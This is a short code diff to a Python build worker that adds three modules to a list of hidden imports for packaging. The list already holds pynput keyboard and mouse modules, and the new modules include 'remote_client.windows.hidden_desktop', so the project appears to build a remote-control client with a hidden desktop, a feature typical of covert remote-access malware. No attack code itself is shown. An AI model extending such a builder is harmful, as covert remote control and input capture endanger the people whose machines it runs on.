@@ -269,6 +269,9 @@ class BuilderWorker(QtCore.QThread):
             "pynput",
             "pynput.mouse",
             "pynput.keyboard",
+            "remote_client.apps",
+            "remote_client.apps.launcher",
+            "remote_client.windows.hidden_desktop",
         ]
         for module in hidden_imports:
             args.extend(["--hidden-import", module])
